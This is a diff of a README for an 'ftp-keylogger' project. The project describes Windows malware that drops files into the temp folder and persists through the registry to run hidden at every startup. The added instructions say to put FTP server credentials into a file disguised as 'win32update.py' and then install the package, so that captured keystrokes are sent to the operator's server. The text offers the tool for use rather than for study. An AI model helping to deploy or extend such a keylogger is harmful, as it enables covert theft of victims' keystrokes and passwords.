@@ -1,3 +1,7 @@
 # ftp-keylogger
 
 A simple keylogger copying malicious files in windows's temp folder and on every startup it will run in background once copied the tree folder inside windows register
+
+Instructions:
+1) Modify ftp login (host, username, password) in win32update.py
+2) Run in cmd "sudo python setup_w.py install"
